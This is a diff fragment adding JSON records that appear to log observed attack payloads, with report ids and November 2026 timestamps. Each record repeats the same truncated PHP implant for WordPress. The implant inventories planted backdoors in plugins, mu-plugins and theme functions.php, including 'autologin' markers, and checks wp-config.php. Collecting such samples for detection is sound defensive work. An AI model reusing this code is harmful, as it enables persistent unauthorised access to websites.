+      "$tok='WxWgNxe4D0-f5PrfHaxy8wunZc30NGqCe7e7DdFf0U8';$id='58ae9ac66a26ad8e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='XHSS_WIe4Mqh66raXBF1hUhOzM1uf8PM7h0gNNIG1f0';$id='8ce4c033ffe5bd99';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T21:42:49.329000+00:00",
+    "LastSeen": "2026-11-09T21:42:49.329000+00:00",
+    "ReportIds": [
+      "cmw9sf00505q40omll93y5pf4"
+    ],
+    "PayloadExamples": [
+      "$tok='XHSS_WIe4Mqh66raXBF1hUhOzM1uf8PM7h0gNNIG1f0';$id='8ce4c033ffe5bd99';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='XNNQbQbJ_050Pcu-Wn7o2J5j-yae7MWoKbo_ItSx650';$id='81e0e3dc5464f858';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T06:26:16.417000+00:00",
+    "LastSeen": "2026-11-12T06:26:16.417000+00:00",
+    "ReportIds": [
+      "cmwd5zv6i01pu0omlhoznj1uk"
+    ],
+    "PayloadExamples": [
+      "$tok='XNNQbQbJ_050Pcu-Wn7o2J5j-yae7MWoKbo_ItSx650';$id='81e0e3dc5464f858';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='ZIz7n7Mcf2M4c6udAtTUpZh7XpGj3HxSY2FGHMIO1Gw';$id='44693d5cc82e3dda';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:54:52.167000+00:00",
+    "LastSeen": "2026-11-11T09:54:52.167000+00:00",
+    "ReportIds": [
+      "cmwby09qt02ky0omlsfqx4bp3"
+    ],
+    "PayloadExamples": [
+      "$tok='ZIz7n7Mcf2M4c6udAtTUpZh7XpGj3HxSY2FGHMIO1Gw';$id='44693d5cc82e3dda';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='ZJxwoAtSoXmarObW39aYMewfxZze9kK_LGG7S4xjk-k';$id='a14cafdfddf3e35d';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:40:14.587000+00:00",
+    "LastSeen": "2026-11-11T09:40:14.587000+00:00",
+    "ReportIds": [
+      "cmwbxhglq01xh0omlyvj6ht79"
+    ],
+    "PayloadExamples": [
+      "$tok='ZJxwoAtSoXmarObW39aYMewfxZze9kK_LGG7S4xjk-k';$id='a14cafdfddf3e35d';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='aT4UGJ6KOOTjg1uIgezmyN63JLNRWWQeJKC7TYUreFA';$id='4057e20af0caf7ad';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:54:01.319000+00:00",
+    "LastSeen": "2026-11-11T09:54:01.319000+00:00",
+    "ReportIds": [
+      "cmwbxz6hp02fb0omlrj2jq96w"
+    ],
+    "PayloadExamples": [
+      "$tok='aT4UGJ6KOOTjg1uIgezmyN63JLNRWWQeJKC7TYUreFA';$id='4057e20af0caf7ad';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='cGp97BoHYdZxRBlWC1NBdcV_XMeGMWQwlnFG7qSQXFc';$id='64980c0efd83dc4b';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T05:30:29.722000+00:00",
+    "LastSeen": "2026-11-09T05:30:29.722000+00:00",
+    "ReportIds": [
+      "cmw8tokv922us0omlidqlq47p"
+    ],
+    "PayloadExamples": [
+      "$tok='cGp97BoHYdZxRBlWC1NBdcV_XMeGMWQwlnFG7qSQXFc';$id='64980c0efd83dc4b';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
